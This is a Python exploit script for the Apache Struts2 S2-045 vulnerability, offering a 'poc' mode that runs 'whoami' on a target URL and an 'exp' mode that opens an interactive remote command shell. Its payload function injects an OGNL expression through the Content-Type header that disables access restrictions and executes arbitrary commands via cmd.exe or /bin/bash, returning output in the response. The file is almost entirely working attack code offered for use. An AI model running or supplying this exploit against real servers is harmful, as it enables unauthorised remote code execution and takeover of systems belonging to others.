#! /usr/bin/env python
# encoding:utf-8
import argparse
import requests
import http.client
import sqlalchemy

http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
text = {"Administrator", "system", "root"}


def title():
    print('+-------------------------------------------------------+')
    print("+----------------TOOLS_Des: taamr-----------------------+")
    print('+-------Use :python3 S2-045.py -u url -m poc/exp--------+')
    print('+-------------------------------------------------------+')


def payload(url, cmd):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/56.0.2924.87 Safari/537.36",
        "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).("
                        "#_memberAccess?(#_memberAccess=#dm):((#container=#context["
                        "'com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance("
                        "@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear("
                        ")).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + str(
            cmd) + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=("
                   "#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).("
                   "#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=("
                   "@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).("
                   "@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"}
    response = requests.post(url, headers=headers)
    return response.text


def poc(url):
    res = payload(url, "whoami")
    if len(res) < 50:
        print("")
        print("Contains a vulnerability. The result of executing \"whoami\" is:")
        print("")
        print(res)
    else:
        print("")
        print("No s2-045 vulnerabilities ")
        print("")


def exp(url):
    print("please input command, input quit close shell")
    while sqlalchemy.true:
        cmd = input("shell>")
        if cmd == 'quit':
            break
        res = payload(url, cmd)
        print(res)


def main():
    p = argparse.ArgumentParser(description='S2-045 EXP/POC!')
    p.add_argument('-u', dest='url', type=str, help="URL to test")
    p.add_argument('-m', dest='model', type=str, help="model : poc or exp")
    args = p.parse_args()
    url = args.url
    model = args.model
    if not url:
        return print("please set url")
    if not model:
        return print("please set model , -m poc or -m exp")
    elif model == 'poc':
        poc(url)
    elif model == 'exp':
        exp(url)


if __name__ == '__main__':
    title()
    main()
